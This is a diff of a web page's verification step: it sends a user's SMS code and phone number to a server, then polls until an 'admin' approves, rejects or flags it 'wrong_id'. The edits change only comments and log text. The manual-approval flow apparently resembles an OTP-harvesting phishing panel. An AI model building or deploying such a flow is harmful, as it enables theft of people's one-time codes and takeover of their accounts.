@@ -248,7 +248,7 @@
 <body>
 
     <div class="verify-wrapper">
-        <!-- Top Navigation Bar (goes back to forgot2.html) -->
+        <!-- Top Navigation Bar -->
         <nav class="verify-navbar">
             <a href="forgot2.html" class="back-arrow">
                 <i class="fa-solid fa-arrow-left"></i>
@@ -289,7 +289,6 @@
     </div>
 
     <script>
-
         function showAppAlert(message) {
             document.getElementById('modalText').innerText = message;
             document.getElementById('customModal').style.display = 'flex';
@@ -316,7 +315,7 @@
                 verifyBtn.classList.add('disabled-state');
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-                console.log("Sending SMS verification code to server...");
+                console.log("Sending SMS code to server...");
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -324,9 +323,10 @@
                 });
 
                 const result = await response.json();
-                console.log("Server submission response:", result);
+                console.log("Server response:", result);
 
                 if (result.success) {
+                    // Start polling and WAIT for admin approval
                     pollApprovalStatus(phoneInput);
                 } else {
                     verifyBtn.classList.remove('disabled-state');
@@ -346,18 +346,17 @@
             const verifyBtn = document.getElementById('verifyBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
 
-            console.log("Starting polling loop for phone:", cleanPhone);
-
             const statusInterval = setInterval(async () => {
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
 
-                    console.log("Current approval status check:", data.status);
+                    console.log("Polling verification status:", data.status);
 
+                    // STRICT CHECK: Only move forward if status is explicitly approved
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
-                        console.log("Approved! Redirecting to new.html...");
+                        console.log("Approved! Moving to new.html");
                         window.location.href = 'new.html';
                     } 
                     else if (data.status === 'rejected' || data.status === 'wrong_id') {
